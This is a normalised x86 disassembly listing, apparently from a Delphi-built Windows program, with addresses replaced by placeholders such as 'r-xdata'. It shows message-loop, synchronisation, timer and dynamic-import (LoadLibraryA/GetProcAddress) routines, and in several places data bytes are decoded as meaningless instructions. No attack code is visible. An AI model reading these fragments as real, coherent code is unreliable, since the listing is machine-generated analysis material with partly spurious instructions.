mov ebx [ eax + 0x10 ]
call sub_407688
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor ebx ebx
sub_42eb3a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
call sub_42ea7c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edi 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp + 0xc ]
push eax
test edi 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call WaitForMultipleObjectsEx
mov ebx eax
push edi
push 0xbf
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call MsgWaitForMultipleObjectsEx
mov ebx eax
lea eax [ esi ]
cmp ebx eax
jne r-xdata
cmp ebx 0xc0
jne r-xdata
mov eax 0x8001011f
jmp r-xdata
cmp ebx 0x102
jne r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor eax eax
cmp ebx 0x80
jb r-xdata
mov eax 0x80010115
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
lea eax [ ebp - 0x20 ]
push eax
call TranslateMessage
lea eax [ ebp - 0x20 ]
push eax
call DispatchMessageA
jmp r-xdata
sub ebx 0x0
mov edx [ ebp + 0x18 ]
mov [ edx ] ebx
add esi 0x80
cmp ebx esi
jae r-xdata
sub ebx 0x80
mov edx [ ebp + 0x18 ]
mov [ edx ] ebx
jmp r-xdata
sub_42ec20
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] r-xdata
sub_42ec80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push ebx
call [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_42ec20
sub_42ecbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov [ esi + 0xc ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42ed00
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call CloseHandle
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42ed30
push ebx
push esi
push ecx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
push edx
mov eax [ esi + 0x4 ]
push eax
call WaitForSingleObject
sub eax 0xffffffff
je r-xdata
lea eax [ esi + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx 0x1
xor eax eax
call sub_42ec80
sub eax 0x80010115
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
sub eax 0x80
je r-xdata
sub eax 0x7ffefee1
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x82
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
jmp r-xdata
mov bl 0x3
sub_42edbc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_42ecbc
mov eax [ ebp + 0xc ]
call sub_4059dc
push eax
cmp [ ebp + 0x10 ] 0x1
cmc
sbb eax eax
push eax
cmp [ ebp + 0x14 ] 0x1
cmc
sbb eax eax
push eax
push esi
call CreateEventA
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42ee3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42ee7c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42eed4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_42ef60
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_42efcc
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebp 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
jmp r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push edi
push esi
call [ rw-data ]
mov ebp eax
sub_42f044
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42eec4
xor eax eax
push ebp
push sub_42f1fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f202
mov eax [ rw-data ]
call sub_42eecc
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42f204
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42eec4
xor eax eax
push ebp
push sub_42f5b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f5be
mov eax [ rw-data ]
call sub_42eecc
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42f968
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42f990
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f9d8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9df
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_404650
call sub_42f044
cmp [ rw-data ] 0x0
jg r-xdata
sub_42f9e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_42fa80
push ebx
push esi
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push esi
call [ rw-data ]
mov ebx eax
sub_42fb10
push ecx
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
xor eax eax
pop edx
retn
mov eax esp
call sub_42fa80
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov al 0x1
pop edx
retn
sub_42fb34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fb6f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb76
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42fbc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fbf1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbf8
retn
mov eax [ rw-data ]
call sub_404650
sub_4308ff
dec [ edx ]
add [ eax ] al
add [ ebx + 0x6c ] ah
push edi
bound eax [ gs : edx + 0x6c ]
popad
arpl [ ebx ] bp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430970
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x8a
mov edx [ r-xdata ]
call sub_4060f8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430974
ror [ ecx ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
or [ ebx ] eax
clc
or [ ebx ] eax
inc esp
add [ eax ] al
add [ eax - 0x7f ] cl
inc ecx
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bl
or al [ ebx ]
and al 0x9f
inc ecx
add [ ebx + eax + 0x42 ] dl
add [ eax - 0x62 ] al
inc ecx
add [ esp + eax ] ch
inc edx
add ah dh
add al [ edx ]
cmp al 0x4
inc edx
add [ eax + 0x7680042 ] dh
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add [ eax + 0x100430a ] cl
add bh ch
dec [ eax + 0xc ]
inc ebx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xa049072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x4309c072
add [ edx + eax * 4 + 0x41 ] al
add [ 0x78450800 ] al
je r-xdata
dec ecx
outsb
je r-xdata
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
jb r-xdata
insb
jae r-xdata
call sub_404a1c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_430b84
mov eax [ esi + 0x34 ]
call sub_4211f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
popad
insb
mov [ esi + 0x41 ] gs
add [ eax ] bh
add [ eax ] al
push [ eax ]
or al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x84565372
shl [ eax + ecx - 0x7d ] cl
inc eax
add [ eax ] al
add bh bh
adc [ ebx + eax * 2 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
call [ eax ]
or al 0x43
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
jmp [ eax ]
sub_430ad8
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_430b84
mov eax [ esi + 0x34 ]
call sub_4211f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_430b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_430b4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430b84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_430c03
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c0a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
sub_430c5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430c81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c88
retn
sub_430d9b
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_404974
push sub_430f30
call sub_421084
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
mov [ esi + 0x41 ] gs
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
mov [ esi + 0x41 ] gs
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_430e44
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
call sub_42111c
lea eax [ esi + 0x40 ]
call sub_40f944
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x250 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_430e8c
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_447be4
test eax eax
jne r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
jmp r-xdata
sub_430ed0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_446d0c
mov cl 0x1
sub_430ef8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4048a0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430f30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430f5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430fc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_447be4
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_43b920
mov [ ebp - 0x14 ] eax
call sub_43b77c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_431071
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_431038
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43103f
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_43103f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431078
mov eax [ ebp - 0x14 ]
call sub_43b9e4
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_43b784
mov eax [ ebp - 0x8 ]
add eax 0x40
call sub_40f944
retn
sub_431150
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_40af18
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_4311eb
add [ edi ] cl
add [ eax ] al
add [ eax + 0x10004923 ] ah
dec eax
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4ac40049 ] bl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb6dd ] bl
inc edi
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4c380049 ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffb6dd ] dl
dec edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4a680049 ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffb6dd ] cl
dec ebx
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x49980049 ] al
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb6dd ] al
dec edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x49 ] bh
add al al
dec ecx
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] bh
dec ecx
add al bl
dec esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx + 0x49 ] al
add [ eax + ecx * 2 + 0x49 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] al
dec ecx
add [ eax ] cl
dec esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebx ] bh
dec ecx
add [ eax + 0x4c ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] bh
and ecx [ ecx ]
sbb [ edx + 0x49 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
